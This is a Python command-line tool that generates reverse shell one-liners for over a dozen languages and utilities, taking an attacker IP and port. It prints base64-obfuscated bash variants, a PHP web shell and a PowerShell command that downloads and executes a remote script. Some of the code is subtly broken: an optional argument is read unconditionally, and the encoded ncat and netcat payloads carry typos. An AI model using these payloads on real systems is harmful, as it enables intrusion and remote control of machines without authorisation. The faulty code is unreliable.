#!/usr/bin/env python3

# Topic : Reverse Shell Generator (Python3)
# Author : Subhankar Paul
# Github Page
# Date : 23-09-2023
# Usage : python3 <ip> <port> <platform> <shell_type>
# Use python3 rev_gen.py for help

import sys
import socket
import base64

# Script Banner

banner = '''   
\033[1m\033[94m 
###################################################################################
#  _________   _________   ___       ___      ______    _________    ___     __   #
# |  _____  |  |  ______|  \  \     /  /     |  ____|   |  ______|  |    \  |  |  #
# |  |   |  |  |  |___      \  \   /  /      |  |       |  |___     |  |  \ |  |  #
# |  | _ |__|  |      |      \  \_/  /       |  | ____  |      |    |  |\  \|  |  #
# |  | \  \    |   ___|       \     /        |  |_|  |  |   ___|    |  | \  \  |  #
# |  |  \  \   |  |_____       \   /         |       |  |  |_____   |  |  \    |  #
# |__|   \__\  |________|       ---           -------   |________|  |__|   \ __|  #
#										  #
###################################################################################
\033[0m\033[1m\033[91m                                                             
 Python based Reverse Shell Generator                              @starlox#subha                                      
 \033[0m\033[0m 
'''
print(banner)


# Usage of the Script
usage = '''\033[1m[+]\033[0m \033[91m\033[1mUsage\033[0m\033[0m : \033[32mpython3 rev_gen.py IP PORT PLATFORM SHELL_TYPE BASE64_ENCODE\033[0m\n'''

support = "\033[1m[+]\033[0m \033[91m\033[1mPlatform\033[0m\033[0m : \033[32mBash, Netcat, PHP, Python2-3, Perl, Go, Lua, Groovy, PS, Ruby, Nodejs, Socat, Java\033[0m\n"

shell_type = "\033[1m[+]\033[0m \033[91m\033[1mShell Type\033[0m\033[0m : \033[32mbash, sh, zsh, /bin/bash etc......\033[0m\n"

exp = "\033[1m[+]\033[0m \033[91m\033[1mExp\033[0m\033[0m : \033[32mpython3 rev_gen.py 1.1.1.1 1111 php bash\033[0m\n"
note = "\033[1m[+]\033[0m \033[91m\033[1mNote\033[0m\033[0m : \033[32mpython3 rev_gen.py 1.1.1.1 1111 bash bash [--encode] or [-e] encode currently supported for bash, netcat & socat\033[0m\n"



# Function to check if a string is a valid IP Address
def is_valid_ip(ip_str):
    try:
        socket.inet_aton(ip_str)
        return True
    except socket.error:
        return False


# Function to check if a string is a valid port number
def is_valid_port(port_str):
    try:
        port = int(port_str)
        return 0 <= port <= 65535
    except ValueError:
        return False


# Building Logic
if(len(sys.argv) < 5):
    print(usage)
    print(support)
    print(shell_type)
    print(exp)
    print(note)
    sys.exit()

IP = str(sys.argv[1])
PORT = str(sys.argv[2])
PLATFORM = str(sys.argv[3])
ST = str(sys.argv[4])
B64ENCODE=str(sys.argv[5])

def genBase64(payload):
	if B64ENCODE=='--encode' or B64ENCODE=='-e':
		print(f"\033[0m \033[91m\033[1mBase64\033[0m\033[0m ---> \033[94m echo {base64.b64encode(payload.encode('utf-8')).decode('utf-8')} | base64 -d | bash\033[0m\n")

# Validation Confirm
if not is_valid_ip(IP):
    print("\033[1m[+]\033[0m \033[1m\033[32mInvalid IP address. Please provide a Valid IP.\033[0m\033[0m")
    sys.exit()

if not is_valid_port(PORT):
    print("\033[1m[+]\033[0m \033[1m\033[32mInvalid PORT number. Please provide a valid PORT in the range 0-65535.\033[0m\033[0m")
    sys.exit()

LPLATFORM = PLATFORM.lower()


# Main Script Started
def bash_shell(IP,PORT,ST):
	print('''\033[1m\033[32m ************* BASH REVERSE SHELL *************\033[0m\033[0m\n''')
	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94m{ST} -i >& /dev/tcp/{IP}/{PORT} 0>&1\033[0m\n")
	genBase64(f"{ST} -i >& /dev/tcp/{IP}/{PORT} 0>&1")
	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94m0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {ST} <&196 >&196 2>&196\033[0m\n")
	genBase64(f"0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {ST} <&196 >&196 2>&196")
	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94m{ST} -i 5<> /dev/tcp/{IP}/{PORT} 0<&5 1>&5 2>&5\033[0m\n")
	genBase64(f"{ST} -i 5<> /dev/tcp/{IP}/{PORT} 0<&5 1>&5 2>&5")
	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94m{ST} -i >& /dev/udp/{IP}/{PORT} 0>&1\033[0m   \033[1m[+]\033[0m BASH UDP\n")
	genBase64(f"{ST} -i >& /dev/udp/{IP}/{PORT} 0>&1")
	print("\033[1m\033[32m----------- Please choose Your Preference ------------\033[0m\033[0m\n")

def nc_shell(IP,PORT,ST):
	print('''\033[1m\033[32m************* NETCAT REVERSE SHELL *************\033[0m\033[0m\n''')
	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{ST} -i 2>&1|nc {IP} {PORT} >/tmp/f\033[0m\n")
	genBase64(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{ST} -i 2>&1|nc {IP} {PORT} >/tmp/f")
	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mnc {IP} {PORT} -e {ST}\033[0m\n")
	genBase64(f"nc {IP} {PORT} -e {ST}")
	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mncat {IP} {PORT} -e {ST}\033[0m\n")
	genBase64(f"mncat{IP} {PORT} -e {ST}")
	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mnetcat {IP} {PORT} -e {ST}\033[0m\n")
	genBase64(f"mnetcat{IP} {PORT} -e {ST}")
	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mbusybox nc {IP} {PORT} -e {ST}\033[0m   \033[1m[+]\033[0m Specially for BusyBox\n") 
	genBase64(f"busybox nc {IP} {PORT} -e {ST}")
	print("\033[1m\033[32m----------- Please choose Your Preference ------------\033[0m\033[0m\n")

def php_shell(IP,PORT,ST):
	print('''\033[1m\033[32m ************* PHP REVERSE SHELL *************\033[0m\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mphp -r '$sock=fsockopen("{IP}",{PORT});exec("{ST} <&3 >&3 2>&3");'\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mphp -r '$sock=fsockopen("{IP}",{PORT});shell_exec("{ST} <&3 >&3 2>&3");'\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mphp -r '$sock=fsockopen("{IP}",{PORT});system("{ST} <&3 >&3 2>&3");'\033[0m\n''')	
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mphp -r '$sock=fsockopen("{IP}",{PORT});passthru("{ST} <&3 >&3 2>&3");'\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94m<?php system($_GET['cmd']); ?>   \033[1m[+]\033[0m PHP OnE Liner\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mphp -r '$sock=fsockopen("{IP}",{PORT});popen("{ST} <&3 >&3 2>&3", "r");'\033[0m\n''')
	print("\033[1m\033[32m----------- Please choose Your Preference ------------\033[0m\033[0m\n")
	
def python3_shell(IP,PORT,ST):
	print('''\033[1m\033[32m ************* PYTHON3 REVERSE SHELL *************\033[0m\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mpython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{ST}")'\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mpython3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{IP}",{PORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{ST}")'\033[0m   \033[1m[+]\033[0m Shortest\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mpython3 -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("{ST}")'\033[0m   \033[1m[+]\033[0m Special\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mpython3 -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["{ST}","-i"])'\033[0m   \033[1m[+]\033[0m Special\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mpython3 -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("{IP}",{PORT}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("{ST}")\033[0m   \033[1m[+]\033[0m Special\n''')
	print(f'\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mpython.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen([\'cmd.exe\'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((\'{IP}\',{PORT}));threading.Thread(target=exec,args=(\\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\\"),globals(),daemon=True).start();threading.Thread(target=exec,args=(\\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\\"),globals()).start()"\033[0m   \033[1m[+]\033[0m Only for Windows\n')
	print("\033[1m\033[32m----------- Please choose Your Preference ------------\033[0m\033[0m\n")

def python_shell(IP,PORT,ST):
	print('''\033[1m\033[32m ************* PYTHON REVERSE SHELL *************\033[0m\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mexport RHOST="{IP}";export RPORT={PORT};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{ST}")'\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mpython -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("{ST}")'\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mpython -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["{ST}","-i"])'\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mpython -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("{IP}",{PORT}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("{ST}")\033[0m\n''')
	print("\033[1m\033[32m----------- Please choose Your Preference ------------\033[0m\033[0m\n")
	
def ruby_shell(IP,PORT,ST):
	print('''\033[1m\033[32m ************* RUBY REVERSE SHELL *************\033[0m\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mruby -rsocket -e'spawn("{ST}",[:in,:out,:err]=>TCPSocket.new("{IP}",{PORT}))'\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mruby -rsocket -e'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("{ST} -i <&%d >&%d 2>&%d",f,f,f)'\033[0m\n
''')	
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mruby -rsocket -e 'c=TCPSocket.new("{IP}","{PORT}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'\033[0m   \033[1m[+]\033[0m Only for Windows\n''')
	print("\033[1m\033[32m----------- Please choose Your Preference ------------\033[0m\033[0m\n")

def groovy_shell(IP,PORT,ST):
	print('''\033[1m\033[32m ************* GROOVY REVERSE SHELL *************\033[0m\033[0m\n''')
	print("\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mString host=",IP,";int port=",PORT,";String cmd=",ST,";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\033[0m\n")
	
def go_shell(IP,PORT,ST):
	print('''\033[1m\033[32m ************* GO REVERSE SHELL *************\033[0m\033[0m\n''')
	print('''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mecho 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial("tcp","'''+IP+":"+PORT+'''");cmd:=exec.Command("'''+ST+'''");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\033[0m\n''')
	
def lua_shell(IP,PORT,ST):
	print('''\033[1m\033[32m ************* LUA REVERSE SHELL *************\033[0m\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mlua -e "require('socket');require('os');t=socket.tcp();t:connect('{IP}','{PORT}');os.execute('{ST} -i <&3 >&3 2>&3');"\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mlua5.1 -e 'local host, port = "{IP}", {PORT} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'\033[0m\n''')
	print("\033[1m\033[32m----------- Please choose Your Preference ------------\033[0m\033[0m\n")
	
def perl_shell(IP,PORT,ST):
	print('''\033[1m\033[32m ************* PERL REVERSE SHELL *************\033[0m\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mperl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{IP}:{PORT}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mperl -e 'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{ST} -i");}};'\033[0m\n''')
	print("\033[1m\033[32m----------- Please choose Your Preference ------------\033[0m\033[0m\n")
	
def ps_shell(IP,PORT,ST):
	print('''\033[1m\033[32m ************* POWERSHELL REVERSE SHELL *************\033[0m\033[0m\n''')
	print("\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94m$LHOST = ",IP,"; $LPORT = ",PORT,"; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write('$Output`n'); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()\033[0m\n")
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mpowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$$sendback = (iex $$data 2>&1 | Out-String );$$sendback2  = $$sendback + "PS " + (pwd).Path + "> ";$$sendbyte = ([text.encoding]::ASCII).GetBytes($$sendback2);$stream.Write($$sendbyte,0,$$sendbyte.Length);$stream.Flush()}};$client.Close()\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mpowershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$$sendback = (iex $$data 2>&1 | Out-String );$$sendback2 = $$sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($$sendback2);$stream.Write($$sendbyte,0,$$sendbyte.Length);$stream.Flush()}};$client.Close()"\033[0m\n''')
	print( f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mpowershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')\033[0m\n''')
	print("\033[1m\033[32m----------- Please choose Your Preference ------------\033[0m\033[0m\n")

def nodejs_shell(IP,PORT,ST):
	print('''\033[1m\033[32m ************* NODE_JS REVERSE SHELL *************\033[0m\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mrequire('child_process').exec('nc -e {ST} {IP} {PORT}')\033[0m\n''')
	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94m(function(){{ var net = require('net'), cp = require('child_process'), sh = cp.spawn('{ST}', []); var client = new net.Socket(); client.connect({PORT}, '{IP}', function(){{ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }}); return /a/;}})();\033[0m   \033[1m[+]\033[0m Run with [node -e]\033[0m\n")
	print("\033[1m\033[32m----------- Please choose Your Preference ------------\033[0m\033[0m\n")
	
def socat_shell(IP,PORT,ST):
	print('''\033[1m\033[32m ************* SOCAT REVERSE SHELL *************\033[0m\033[0m\n''')
	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94msocat TCP:{IP}:{PORT} EXEC:{ST}\033[0m\n")
	genBase64(f"socat TCP:{IP}:{PORT} EXEC:{ST}")
	print(f"\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94msocat TCP:{IP}:{PORT} EXEC:'{ST}',pty,stderr,setsid,sigint,sane\033[0m\n")
	genBase64(f"socat TCP:{IP}:{PORT} EXEC:'{ST}',pty,stderr,setsid,sigint,sane")
	print("\033[1m\033[32m----------- Please choose Your Preference ------------\033[0m\033[0m\n")
	
def java_shell(IP,PORT,ST):
	print('''\033[1m\033[32m ************* JAVA REVERSE SHELL *************\033[0m\033[0m\n''')
	print(f'''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mRuntime r = Runtime.getRuntime();
Process p = r.exec("{ST} -c 'exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();\033[0m\n
''')
	print('''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mpublic class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("'''+ST+''' -c $@|'''+ST+''' 0 echo '''+ST+' -i >& /dev/tcp/'+IP+'/'+PORT+''' 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}\033[0m\n''')
	print('''\033[1m[+]\033[0m \033[91m\033[1mTry this\033[0m\033[0m ---> \033[94mpublic class shell {
    public static void main(String[] args) {
        ProcessBuilder pb = new ProcessBuilder("'''+ST+'\", "-c", "$@| '+ST+''' -i >& /dev/tcp/'''+IP+'/'+PORT+''' 0>&1")
            .redirectErrorStream(true);
        try {
            Process p = pb.start();
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}\033[0m\n''')
	print("\033[1m\033[32m---------- Please choose Your Preference ------------\033[0m\033[0m\n")

	
# Checking For Specific Platform
if (LPLATFORM == "php"):
	php_shell(IP,PORT,ST)
elif (LPLATFORM == "bash"):
	bash_shell(IP,PORT,ST)
elif (LPLATFORM == "nc" or LPLATFORM == "netcat"):
	nc_shell(IP,PORT,ST)
elif (LPLATFORM == "python3" or LPLATFORM == "python2"):
	python3_shell(IP,PORT,ST)
elif (LPLATFORM == "python"):
	python_shell(IP,PORT,ST)
elif (LPLATFORM == "ruby"):
	ruby_shell(IP,PORT,ST)
elif (LPLATFORM == "groovy"):
	groovy_shell(IP,PORT,ST)
elif (LPLATFORM == "go" or LPLATFORM == "golang"):
	go_shell(IP,PORT,ST)
elif (LPLATFORM == "lua"):
	lua_shell(IP,PORT,ST)
elif (LPLATFORM == "perl"):
	perl_shell(IP,PORT,ST)
elif (LPLATFORM == "ps" or LPLATFORM == "powershell"):
	ps_shell(IP,PORT,ST)
elif (LPLATFORM == "node" or LPLATFORM == "nodejs" or LPLATFORM == "js"):
	nodejs_shell(IP,PORT,ST)
elif (LPLATFORM == "socat"):
	socat_shell(IP,PORT,ST)
elif (LPLATFORM == "java"):
	java_shell(IP,PORT,ST)
else:
	print("\033[1m[+]\033[0m Invalid Platform")
	print("\033[1m[+]\033[0m Please Use \033[1m\033[32m./rev_gen.py -h\033[0m\033[0m To See Supported Platform\n")


##################### END OF CODE #####################











